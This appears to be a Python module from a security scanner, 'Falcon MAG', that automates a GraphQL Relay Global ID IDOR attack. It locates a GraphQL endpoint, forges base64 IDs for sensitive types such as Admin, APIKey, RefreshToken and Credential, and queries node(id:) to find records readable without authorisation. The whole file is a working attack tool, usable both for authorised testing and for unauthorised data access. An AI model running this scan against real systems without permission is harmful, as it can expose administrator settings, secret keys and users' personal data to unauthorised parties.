"""Falcon MAG - GraphQL Relay Global ID IDOR Scanner

GraphQL Relay spec uses Global IDs: id = base64("TypeName:rawId")
Examples: Q29tcGFueTox = "Company:1"

Attack:
  Attackers forge Global IDs with sensitive type names
  (Admin, SecretAdminSettings, RootUser, APIKey) and query them
  via the `node(id:)` interface → information disclosure.

Technique:
  1. Find GraphQL endpoint
  2. Query a legit Global ID (from viewer/me)
  3. Dictionary attack: for each sensitive TypeName + id
  4. Query node(id:...) fragment on TypeName
  5. If not "type not found" → potential IDOR

Based on Amin Sadati research.
Compatible with Falcon HTTPResponse.
"""
import base64
import json
import re
from urllib.parse import urljoin

from core.logger import get_logger

log = get_logger("graphql_relay_idor")

ENDPOINT_PATHS = [
    "/graphql", "/api/graphql", "/gql", "/api/gql",
    "/v1/graphql", "/v2/graphql", "/api/v1/graphql", "/api/v2/graphql",
]

# Sensitive GraphQL type names for forged Global IDs
SENSITIVE_TYPES = [
    # Auth / Admin
    "Admin", "AdminUser", "SuperAdmin", "RootUser", "Root",
    "AdminSettings", "SecretAdminSettings", "SystemConfig",
    "InternalConfig", "GlobalSettings", "AppConfig",
    # Secrets
    "APIKey", "ApiKey", "Token", "RefreshToken", "Secret", "Credential",
    "DatabaseBackup", "Backup", "Snapshot", "Dump",
    # Users / PII
    "User", "UserProfile", "Customer", "Account",
    "Employee", "Staff", "InternalUser",
    # Company / Org
    "Company", "Organization", "OrganizationSettings", "Tenant",
    # Files
    "PrivateFile", "InternalFile", "SecretFile", "Document", "Attachment",
    # Audit
    "AuditLog", "InternalNote", "Activity", "Event", "Log",
]

RAW_IDS = ["1", "2", "0", "admin", "root", "test", "me", "self"]


def _b64_encode(s):
    return base64.b64encode(s.encode()).decode()


def _b64_decode(s):
    try:
        return base64.b64decode(s).decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _extract_status(r):
    """Falcon HTTPResponse uses .status, requests uses .status_code."""
    if r is None:
        return None
    for attr in ("status", "status_code"):
        v = getattr(r, attr, None)
        if v is not None:
            try:
                return int(v)
            except Exception:
                continue
    return None


def _find_endpoint(client, target):
    """Find a working GraphQL endpoint."""
    for path in ENDPOINT_PATHS:
        url = urljoin(target.rstrip("/") + "/", path.lstrip("/"))
        try:
            r = client.post(url, json={"query": "{ __typename }"}, timeout=8)
        except Exception:
            continue
        if r is None:
            continue
        status = _extract_status(r)
        if status != 200:
            continue
        try:
            text = getattr(r, "text", "") or ""
            d = json.loads(text)
            if "data" in d:
                return url
        except Exception:
            continue
    return None


def _try_node(client, endpoint, global_id, typename):
    """Query node(id:) with fragment. Return (ok, response_dict)."""
    query = (
        'query FalconIDOR { node(id: "%s") { __typename ... on %s { __typename } } }'
        % (global_id, typename)
    )
    try:
        r = client.post(endpoint, json={"query": query}, timeout=8)
    except Exception:
        return False, None
    if r is None:
        return False, None
    status = _extract_status(r)
    if status != 200:
        return False, None
    try:
        text = getattr(r, "text", "") or ""
        data = json.loads(text)
    except Exception:
        return False, None

    errors = data.get("errors") or []
    if errors:
        err_text = " ".join(str(e.get("message", "")) for e in errors).lower()
        # Type doesn't exist → NOT vulnerable
        if any(k in err_text for k in (
            "unknown type", "not found", "cannot query field",
            "invalid", "does not exist", "no such type",
            "must not have a selection", "field 'node' doesn't exist",
        )):
            return False, None
    # No error → potential hit
    return True, data


def _get_legit_global_id(client, endpoint):
    """Try to get a legit Global ID for structural reference."""
    probes = [
        '{ viewer { id } }',
        '{ me { id } }',
        '{ user { id } }',
        '{ currentUser { id } }',
    ]
    for q in probes:
        try:
            r = client.post(endpoint, json={"query": q}, timeout=8)
        except Exception:
            continue
        if r is None:
            continue
        status = _extract_status(r)
        if status != 200:
            continue
        try:
            text = getattr(r, "text", "") or ""
            data = json.loads(text)
        except Exception:
            continue

        def find_id(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if k == "id" and isinstance(v, str) and len(v) > 5:
                        return v
                    r2 = find_id(v)
                    if r2:
                        return r2
            elif isinstance(obj, list):
                for it in obj:
                    r2 = find_id(it)
                    if r2:
                        return r2
            return None

        found = find_id(data.get("data"))
        if found:
            return found
    return None


def run(config=None, client=None, **kwargs):
    if not client:
        return {"error": "no client", "vulnerable": []}

    target = (config.get("target") or "").rstrip("/")
    if not target:
        return {"error": "no target", "vulnerable": []}

    log.info(f"🔍 GraphQL Relay IDOR scan on {target}")

    result = {
        "target": target,
        "endpoint": None,
        "legit_global_id": None,
        "tested": 0,
        "hits": [],
        "vulnerable": [],
    }

    # Find endpoint
    endpoint = _find_endpoint(client, target)
    if not endpoint:
        log.info("  ℹ No GraphQL endpoint found")
        return result
    result["endpoint"] = endpoint
    log.info(f"  Endpoint: {endpoint}")

    # Try to get a legit Global ID
    legit_id = _get_legit_global_id(client, endpoint)
    result["legit_global_id"] = legit_id
    if legit_id:
        decoded = _b64_decode(legit_id)
        log.info(f"  Legit Global ID: {legit_id} = {decoded}")

    # Dictionary attack
    for typename in SENSITIVE_TYPES:
        for raw_id in RAW_IDS:
            global_id = _b64_encode(f"{typename}:{raw_id}")
            result["tested"] += 1

            ok, data = _try_node(client, endpoint, global_id, typename)
            if ok:
                log.warning(f"  ⚠ Possible IDOR: {typename}:{raw_id}")
                result["hits"].append({
                    "typename": typename,
                    "raw_id": raw_id,
                    "global_id": global_id,
                    "response": str(data)[:300],
                })
                result["vulnerable"].append({
                    "url": endpoint,
                    "original_url": target,
                    "injected_url": endpoint,
                    "param": f"node(id:{global_id})",
                    "payload": f'{typename}:{raw_id}',
                    "severity": "high",
                    "description": f"GraphQL Relay IDOR: '{typename}' type accessible with forged Global ID",
                    "evidence": str(data)[:300],
                })

    if not result["hits"]:
        log.info("  ℹ No IDOR hits (may need real Global IDs from the app)")

    return result